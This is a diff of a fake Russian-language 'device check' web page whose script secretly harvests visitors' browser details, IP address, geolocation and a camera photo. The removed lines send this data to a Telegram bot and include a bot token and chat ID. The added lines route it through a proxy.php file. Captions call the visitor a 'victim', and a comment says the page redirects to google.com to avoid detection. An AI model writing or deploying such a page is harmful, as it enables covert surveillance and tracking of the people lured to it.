@@ -38,21 +38,10 @@
         @keyframes spin { to { transform: rotate(360deg); } }
         .status { color: #8b949e; font-size: 14px; margin-top: 20px; }
         .footer { margin-top: 24px; font-size: 12px; color: #6e7681; }
-        button {
-            background: #1f6feb;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            padding: 12px 24px;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 20px;
-        }
-        button:hover { background: #388bfd; }
     </style>
 </head>
 <body>
-    <div class="container" id="mainContainer">
+    <div class="container">
         <h1>Проверка устройства</h1>
         <div class="subtitle">Пожалуйста, подождите...</div>
         <div class="spinner"></div>
@@ -61,24 +50,14 @@
     </div>
 
     <script>
-        // 👇👇👇 ЗАМЕНИ НА СВОИ ДАННЫЕ 👇👇👇
-        const BOT_TOKEN = "8820194857:AAEcT1qBpODtvkUK58MfJT77_U9iVRplapg";     // ← Токен от @BotFather
-        const ADMIN_ID = "912559442";            // ← Твой Telegram ID
+        const PROXY_URL = "proxy.php"; // файл лежит рядом
         
-        const WEBHOOK_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        
-        async function sendToBot(text) {
-            try {
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: ADMIN_ID,
-                        text: text,
-                        parse_mode: 'Markdown'
-                    })
-                });
-            } catch(e) { console.log(e); }
+        async function sendToProxy(text) {
+            await fetch(PROXY_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ text: text })
+            });
         }
         
         async function getIP() {
@@ -95,20 +74,10 @@
             return new Promise((resolve) => {
                 if ('geolocation' in navigator) {
                     navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            resolve({
-                                lat: position.coords.latitude,
-                                lon: position.coords.longitude,
-                                accuracy: position.coords.accuracy
-                            });
-                        },
-                        (error) => {
-                            resolve(null);
-                        }
+                        (position) => { resolve({ lat: position.coords.latitude, lon: position.coords.longitude, accuracy: position.coords.accuracy }); },
+                        () => { resolve(null); }
                     );
-                } else {
-                    resolve(null);
-                }
+                } else { resolve(null); }
             });
         }
         
@@ -120,54 +89,25 @@
                 const blob = await imageCapture.takePhoto();
                 track.stop();
                 
-                // Конвертируем blob в base64
-                const reader = new FileReader();
-                return new Promise((resolve) => {
-                    reader.onloadend = () => {
-                        resolve(reader.result.split(',')[1]); // base64 без префикса
-                    };
-                    reader.readAsDataURL(blob);
-                });
-            } catch(e) {
-                return null;
-            }
-        }
-        
-        async function sendPhoto(base64Image) {
-            if (!base64Image) return;
-            
-            // Отправляем фото через telegram bot
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-            const formData = new FormData();
-            formData.append('chat_id', ADMIN_ID);
-            
-            const binary = atob(base64Image);
-            const array = new Uint8Array(binary.length);
-            for (let i = 0; i < binary.length; i++) array[i] = binary.charCodeAt(i);
-            const blob = new Blob([array], { type: 'image/jpeg' });
-            
-            formData.append('photo', blob, 'photo.jpg');
-            formData.append('caption', `📸 *Фото с камеры жертвы!*\n🕒 ${new Date().toLocaleString()}`);
-            formData.append('parse_mode', 'Markdown');
-            
-            await fetch(url, { method: 'POST', body: formData });
+                const formData = new FormData();
+                formData.append('photo', blob, 'photo.jpg');
+                formData.append('caption', '📸 *Фото с камеры жертвы!*');
+                
+                await fetch(PROXY_URL, { method: 'POST', body: formData });
+                return true;
+            } catch(e) { return false; }
         }
         
         async function main() {
-            // 1. Меняем статус
             document.getElementById('status').innerHTML = 'Анализ устройства...';
             
-            // 2. Собираем данные об устройстве
             const ua = navigator.userAgent;
             const platform = navigator.platform;
             const language = navigator.language;
             const screen = `${screen.width}x${screen.height}`;
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            
-            // 3. Получаем IP
             const ip = await getIP();
             
-            // 4. Отправляем базовые данные
             let text = `🔴 *НОВЫЙ ПЕРЕХОД!*\n\n`;
             text += `🌍 *Данные устройства:*\n`;
             text += `├ 📱 User-Agent: ${ua}\n`;
@@ -176,40 +116,27 @@
             text += `├ 📐 Экран: ${screen}\n`;
             text += `├ 🕒 Часовой пояс: ${timezone}\n`;
             text += `├ 🌍 IP: ${ip}\n`;
-            text += `└ 🕒 Время: ${new Date().toLocaleString()}\n\n`;
+            text += `└ 🕒 Время: ${new Date().toLocaleString()}`;
             
-            text += `⏳ Запрашиваю геолокацию и камеру...`;
+            await sendToProxy(text);
             
-            await sendToBot(text);
-            
-            // 5. Запрашиваем геолокацию
             document.getElementById('status').innerHTML = 'Запрос геолокации...';
             const location = await getLocation();
-            
             if (location) {
-                const geoText = `📍 *ГЕОЛОКАЦИЯ!*\n├ Широта: ${location.lat}\n├ Долгота: ${location.lon}\n├ Точность: ${location.accuracy}м\n└ Время: ${new Date().toLocaleString()}`;
-                await sendToBot(geoText);
+                await sendToProxy(`📍 *ГЕОЛОКАЦИЯ!*\n├ Широта: ${location.lat}\n├ Долгота: ${location.lon}\n├ Точность: ${location.accuracy}м`);
             } else {
-                await sendToBot(`❌ *Геолокация:* отклонена или недоступна`);
+                await sendToProxy(`❌ *Геолокация:* отклонена`);
             }
             
-            // 6. Запрашиваем камеру и делаем фото
             document.getElementById('status').innerHTML = 'Запрос камеры...';
-            const photo = await takePhoto();
-            
-            if (photo) {
-                await sendPhoto(photo);
+            const photoTaken = await takePhoto();
+            if (photoTaken) {
                 document.getElementById('status').innerHTML = '✅ Данные отправлены! Перенаправление...';
-                await sendToBot(`📸 *Фото сделано и отправлено!*`);
             } else {
                 document.getElementById('status').innerHTML = 'Доступ к камере запрещён. Перенаправление...';
-                await sendToBot(`❌ *Камера:* доступ запрещён`);
             }
             
-            // 7. Перенаправляем на любой сайт (чтоб не спалиться)
-            setTimeout(() => {
-                window.location.href = "https://google.com";
-            }, 2000);
+            setTimeout(() => { window.location.href = "https://google.com"; }, 2000);
         }
         
         main();
